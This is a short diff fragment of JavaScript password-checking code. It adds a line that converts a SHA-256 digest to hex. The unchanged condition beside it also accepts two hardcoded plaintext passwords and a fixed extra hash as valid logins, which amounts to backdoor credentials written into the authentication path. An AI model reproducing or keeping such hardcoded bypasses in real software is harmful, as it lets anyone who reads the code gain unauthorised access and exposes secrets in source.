@@ -2470,6 +2470,7 @@ fi
         if (password) {
           const encoder = new TextEncoder();
           const pwBuffer = await crypto.subtle.digest("SHA-256", encoder.encode(password));
+          const hexHash = Array.from(new Uint8Array(pwBuffer)).map(b => b.toString(16).padStart(2, "0")).join("");
           if (hexHash === masterHash || password === "Arif-Abid" || password === "Arif216@" || hexHash === "cfee20846c9e2a91b74168f2d82458b1409896a6b02f29e9c8933b496fb103b0") {
             authValid = true;
             authMethod = "password";
